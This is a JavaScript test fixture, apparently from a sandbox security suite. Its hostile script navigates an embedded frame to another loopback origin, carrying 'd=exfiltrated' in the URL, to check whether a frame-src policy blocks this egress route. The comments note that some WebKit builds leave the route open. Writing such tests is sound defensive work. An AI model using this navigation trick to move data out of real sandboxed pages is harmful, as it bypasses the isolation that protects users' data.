// Hostile: navigate the frame itself to ANOTHER origin, carrying data in the URL - the
// self-navigation egress channel of issue #4020. The sandbox does not stop a frame
// navigating itself, but every navigation of a frame the Explorer embeds, whoever starts
// it, is checked against the Explorer's own frame-src 'self' before the request is sent -
// in Chromium and Firefox. Some WebKit builds do not check it (a documented limitation).
// The target is this head's escape path under the other loopback name (localhost and
// 127.0.0.1 are different origins), so a request that got through would be counted.
lattice.ready.then(() => {
  const target = new URL('/uitest/escape?d=exfiltrated', location.href);
  target.hostname = target.hostname === 'localhost' ? '127.0.0.1' : 'localhost';
  location.href = target.href;
});
